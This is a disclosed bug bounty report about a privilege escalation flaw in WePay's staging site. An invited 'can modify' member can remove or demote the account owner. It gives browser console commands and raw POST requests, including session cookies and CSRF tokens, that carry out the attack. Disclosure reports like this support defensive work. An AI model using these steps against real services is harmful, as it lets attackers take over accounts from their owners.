@@ -1,0 +1,86 @@
+ReportLink:https://hackerone.com/reports/142842
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/eboda
+ReportedTo:WePay(wepay)
+BountyAmount:250.0
+Severity:
+State:Closed
+DateOfDisclosure:06.08.2016 7:55:38
+
+Summary:
+
+Summary
+--------------
+
+If an invited user in an account has "can modify" privileges, he can modify the privileges of the owner of the account or even just completely remove him.
+
+Steps to reproduce
+--------------
+
+1. Create an account and got to `https://stage.wepay.com/account/settings/access/[ACCOUNT_ID]` to invite a second member with the rights `can modify`.
+2. Login as the invited member and accept the invitation. 
+    Do the following steps in the session of the invited member:
+    - Go again to `https://stage.wepay.com/account/settings/access/[ACCOUNT_ID]`
+    - Open your Developers console on firefox/chrome 
+    - type in: 
+
+        ```
+             a = angular.element("body").scope().$$childTail
+             m = a.AccountSettings.Access.members
+             m
+        ```
+       this should list the two members (i.e. `Object { [OWNER_ID]: Object, [YOUR_ID]: Object }`) in this account (the owner and you). Remember the `id` of the owner.
+     - now to delete the owner from the account, you can simply do:
+
+         ```
+         a.AccountSettings.Access.member_remove(m[OWNER_ID])
+         ```
+3. The owner is now removed from the account. 
+4. If instead of removing him, you just want to give him different rights, you can do:
+
+    ```
+         m[OWNER_ID].option = "member"
+         a.AccountSettings.Access.member_change(m[OWNER_ID])
+    ```
+     The owner will now have only "Can View" rights.
+
+Additional Info
+-----------------
+
+Of course the steps I described just produce some POST requests. I just thought through the console it is easier and faster to reproduce. But if you are interested in the raw POST requests and for completions sake, here they are:
+
+###Remove
+```
+POST /account_ajax/member/292208436?form=remove HTTP/1.1
+Host: stage.wepay.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: application/json, text/plain, */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json;charset=utf-8
+Referer: https://stage.wepay.com/account/settings/access/292208436
+Content-Length: 311
+Cookie: sso_user=YTo4OntzOjQ6Im5hbWUiO3M6ODoic3NvX3VzZXIiO3M6NToidmFsdWUiO2k6OTAzMDE4NjQ7czo2OiJkb21haW4iO3M6MTU6InN0YWdlLndlcGF5LmNvbSI7czo0OiJwYXRoIjtzOjE6Ii8iO3M6NzoiZXhwaXJlcyI7aToxNTU1MjAwMDtzOjY6InNlY3VyZSI7YjoxO3M6ODoiaHR0cG9ubHkiO2I6MTtzOjQ6IldTSUciO3M6MTI4OiI4MWU3ZWY2OGU4N2ExMjE2NTFjMjY2MjFiMDE2MGZkNmExNWI5MTRkZTg0YzAzMjExZDU1NDgyMzc4MDE3MWQxMzBiNTQxMjllNzNlNmQ0ZmQwMGExNTZkYTgzYjZkNmI1NWNjMzhmNmViMjdkMWM0OTQ1YmYxN2RhYzZiMmU5YiI7fQ%3D%3D; wepay-session-uid=bb81d84235d27c9921f1d40c27d31a4bf7d1d809e3eb83d5aa6a18e7be76d065-3xMq5gL%2Fmc7Ce2JwidH7Ng4sCJFIW6Zh7jZgmAGobBIn6mG4CWQjvg%3D%3D-ta3089sgre4fot6hkptouno0k3
+Connection: close
+
+{"id":1764659,"group_id":292208436,"email":"yolo12@byom.de","self":false,"role":"admin","photo":"https://duigqbolky454.cloudfront.net/nopic/user_80.png","is_admin":true,"is_owner":true,"is_invite":false,"options":{"moderator":"Can Modify","member":"Can View"},"option":"Owner","csrf":"1dQRbaXhNw8KeREkmH20S96P"}
+```
+
+###Modify
+```
+POST /account_ajax/member/292208436?form=change_permission HTTP/1.1
+Host: stage.wepay.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0
+Accept: application/json, text/plain, */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json;charset=utf-8
+Referer: https://stage.wepay.com/account/settings/access/292208436
+Content-Length: 312
+Cookie: sso_user=YTo4OntzOjQ6Im5hbWUiO3M6ODoic3NvX3VzZXIiO3M6NToidmFsdWUiO2k6OTAzMDE4NjQ7czo2OiJkb21haW4iO3M6MTU6InN0YWdlLndlcGF5LmNvbSI7czo0OiJwYXRoIjtzOjE6Ii8iO3M6NzoiZXhwaXJlcyI7aToxNTU1MjAwMDtzOjY6InNlY3VyZSI7YjoxO3M6ODoiaHR0cG9ubHkiO2I6MTtzOjQ6IldTSUciO3M6MTI4OiI4MWU3ZWY2OGU4N2ExMjE2NTFjMjY2MjFiMDE2MGZkNmExNWI5MTRkZTg0YzAzMjExZDU1NDgyMzc4MDE3MWQxMzBiNTQxMjllNzNlNmQ0ZmQwMGExNTZkYTgzYjZkNmI1NWNjMzhmNmViMjdkMWM0OTQ1YmYxN2RhYzZiMmU5YiI7fQ%3D%3D; wepay-session-uid=bb81d84235d27c9921f1d40c27d31a4bf7d1d809e3eb83d5aa6a18e7be76d065-3xMq5gL%2Fmc7Ce2JwidH7Ng4sCJFIW6Zh7jZgmAGobBIn6mG4CWQjvg%3D%3D-ta3089sgre4fot6hkptouno0k3
+Connection: close
+
+{"id":1764659,"group_id":292208436,"email":"yolo12@byom.de","self":false,"role":"admin","photo":"https://duigqbolky454.cloudfront.net/nopic/user_80.png","is_admin":true,"is_owner":true,"is_invite":false,"options":{"moderator":"Can Modify","member":"Can View"},"option":"member","csrf":"kJySHJI72Mf6gpDpMfacuc87"}
+```
